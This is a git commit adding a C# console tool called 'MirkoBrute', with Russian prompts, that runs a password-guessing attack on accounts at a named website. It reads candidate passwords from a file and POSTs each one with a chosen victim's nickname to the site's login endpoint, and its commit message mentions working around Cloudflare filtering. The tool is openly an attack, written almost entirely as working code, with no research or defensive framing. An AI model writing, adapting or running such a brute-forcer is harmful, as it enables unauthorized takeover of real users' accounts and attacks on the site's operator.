9742b86310f93629039bef1b61664b894fa4bf24
Artem Prihodov <artem228prihodov@gmail.com>
2018-12-14 14:08:50 +0500

    FIX BUGS, BITCH
    ALSO it version don't work because cloudflare user-agent filtration (i am already work under it)

---
+++ Program.cs
@@ -0,0 +1,52 @@
+﻿using System;
+using System.Collections.Generic;
+using System.Linq;
+using System.Text;
+using System.Threading.Tasks;
+using System.IO;
+
+namespace MirkoBrute
+{
+    class Program
+    {
+        private static string Path = @"password.txt";
+        static void Main(string[] args)
+        {
+            Console.Title = "Mirkobrute 0.3";
+            Console.ForegroundColor = ConsoleColor.Cyan;
+            Console.WriteLine("Добро пожаловать в тестовую версию программы \"MirkoBrute\".");
+            Console.WriteLine("Для начала введите никнейм желаемой к перебору персоны.");
+            Console.Write("\n>> ");
+            Console.ForegroundColor = ConsoleColor.Green;
+            string Nickname = Console.ReadLine();
+            Console.WriteLine("USER: " + Nickname + ", начинаем брут!");
+            if (!File.Exists(Path))
+            {
+                Console.ForegroundColor = ConsoleColor.Red;
+                Console.WriteLine("Не найдена база паролей! Пожалуйста, загрузите базу паролей прежде чем начинать брут.");
+                Console.ForegroundColor = ConsoleColor.White;
+                Console.WriteLine("Для выхода из программы нажмите любую клавишу.");
+            }
+            try
+            {
+                using (StreamReader sr = new StreamReader(Path, System.Text.Encoding.Default))
+                {
+                    string line;
+                    while ((line = sr.ReadLine()) != null)
+                    {
+                        string request = WebRequests.TryLogIn(Nickname, line);
+                        //TODO: Сделать тут вместо вывода проверку JSON-тела ответа
+                        //TODO: Вывод забрученных и не забрученных аккаунтов в логи
+                        Console.WriteLine(request);
+                    }
+                }
+            }
+            catch (Exception e)
+            {
+                //TODO: Сделать нормальный вывод ошибок в логи
+                Console.WriteLine(e);
+                Console.ReadKey();
+            }
+        }
+    }
+}
---
+++ WebRequests.cs
@@ -0,0 +1,39 @@
+﻿using System;
+using System.Collections.Generic;
+using System.Linq;
+using System.Text;
+using System.Threading.Tasks;
+using System.Web;
+using System.IO;
+using System.Net;
+
+namespace MirkoBrute
+{
+    class WebRequests
+    {
+        public String response;
+        //FIXME: Сделать TryLogIn async классом
+        public static string TryLogIn(string login, string password)
+        {
+            var request = WebRequest.Create("https://mirkomir.com/script/login");
+            request.Method = "POST";
+            string data = "login="+login+"&pass="+password+"&remember=true";
+            Byte[] byteArray = System.Text.Encoding.UTF8.GetBytes(data);
+            request.ContentType = "application/x-www-form-urlencoded";
+            request.ContentLength = byteArray.Length;
+            using (Stream dataStream = request.GetRequestStream())
+            {
+                dataStream.Write(byteArray, 0, byteArray.Length);
+            }
+
+            WebResponse response = request.GetResponse();
+            using (Stream stream = response.GetResponseStream())
+            {
+                using (StreamReader reader = new StreamReader(stream))
+                {
+                    return reader.ReadToEnd();
+                }
+            }
+        }
+    }
+}
